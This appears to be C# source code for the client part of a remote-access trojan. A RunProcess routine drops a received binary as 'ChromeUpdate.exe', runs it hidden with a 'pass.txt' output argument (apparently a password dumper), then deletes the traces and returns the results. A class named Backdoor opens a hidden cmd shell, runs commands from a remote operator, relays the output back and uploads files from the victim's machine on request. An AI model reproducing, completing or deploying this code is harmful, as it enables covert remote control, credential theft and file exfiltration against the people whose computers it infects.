using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace Client
{
    static class RunProcess
    {
        private static string Output = "";
        public static string RunWithRedirect(byte[] btorun)
        {
            try
            {
                File.WriteAllBytes("ChromeUpdate.exe", btorun);
                Thread.Sleep(1000);
                //ketu behet ekzekutimi
                var proc = new Process()
                {
                    StartInfo = new ProcessStartInfo("ChromeUpdate.exe")
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                       Arguments = "-f pass.txt"
                    },
                    EnableRaisingEvents = true
                };

                // see below for output handler
              

                proc.Start();

                proc.WaitForExit(1000);

                File.Delete("ChromeUpdate.exe");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            Output = File.ReadAllText("pass.txt");
            File.Delete("pass.txt");

            return Output;
        }

    }

    public static  class Backdoor
    {
        private static Process shell = new Process();								//The shell process
        private static StreamReader fromShell;
        private static StreamWriter toShell;

        private static Thread shellThread;							//So we can destroy the Thread when the client disconnects

        public static bool started = false;
        public static void startServer()
        {
            try
            {
                if (started)
                {
                    try
                    {
                        if (!shell.HasExited)
                        {
                            shell.Kill();
                        }
                    }
                    catch { }
                }
               // shell = new Process();
                ProcessStartInfo p = new ProcessStartInfo("cmd");
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();
                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;

                shellThread = new Thread(new ThreadStart(getShellInput));	//Start a thread to read output from the shell
                shellThread.Start();
                getInput();												    //Prepare to monitor client input...
                // dropConnection();									//When getInput() is terminated the program will come back here
                started = true;
            }
            catch (Exception) { }
        }

        public static void  stopServer()
        {
            if (started)
            {
                try
                {
                    if (!shell.HasExited)
                    {
                        shell.Kill();
                    }
                }
                catch { }
            }
        }

        static void getShellInput()
        {

            try
            {
                String tempBuf = "";
                //  outStream.WriteLine("\r\n");
                while ((tempBuf = fromShell.ReadLine()) != null)
                {

                    Program.A.SendOutput(tempBuf);
                    while ( Program.A.ReadOutput() != "")
                    {
                        Thread.Sleep(100);
                    }
                    // outStream.WriteLine(tempBuf + "\r");
                }

            }
            catch  { /*dropConnection();*/ }


        }

        private static void getInput()
        {
            while (true)
            {
                try
                {
                    String tempBuff = "";										//Prepare a string to hold client commands
                    while (((tempBuff =  Program.A.ReadCmd()) != ""))
                    {			//While the buffer is not null
                        //   Console.WriteLine("Received command: " + tempBuff);
                        Program.A.ClearCmd();
                        if (tempBuff.StartsWith("Upload<"))
                        {
                            string[] spliter = tempBuff.Split('<');
                            if(spliter.Length > 1)
                            {
                                bool success = true;
                                string errormessage = "";
                                string file = spliter[1];
                                if (File.Exists(file))
                                {
                                    try
                                    {
                                        Program.A.WriteFile(Program.myName, "Upload", "cmd", file.Substring(file.LastIndexOf('\\')), File.ReadAllBytes(file));
                                    }
                                    catch (Exception ex)
                                    {
                                        success = false;
                                        errormessage = ex.Message;
                                       
                                    }

                                    if (success)
                                    {
                                        Program.A.SendOutput("File Uploaded Sucessfully!");
                                    }
                                    else
                                    {
                                        Program.A.SendOutput("Error : " + errormessage);
                                    }
                                    while (Program.A.ReadOutput() != "")
                                    {
                                        Thread.Sleep(100);
                                    }
                                }
                                else
                                {
                                    Program.A.SendOutput("Error file does not exist!");
                                    while (Program.A.ReadOutput() != "")
                                    {
                                        Thread.Sleep(100);
                                    }
                                }
                            }
                        }
                        else
                        {
                            handleCommand(tempBuff);
                        }//Handle the client's commands
                    }
                }
                catch (Exception) { }
                Thread.Sleep(100);
            }
        }

        private static void handleCommand(String com)
        {		//Here we can catch commands before they are sent
            try
            {
                toShell.WriteLine(com + "\r\n");
            }
            catch (Exception) { }
        }

       
    }

}
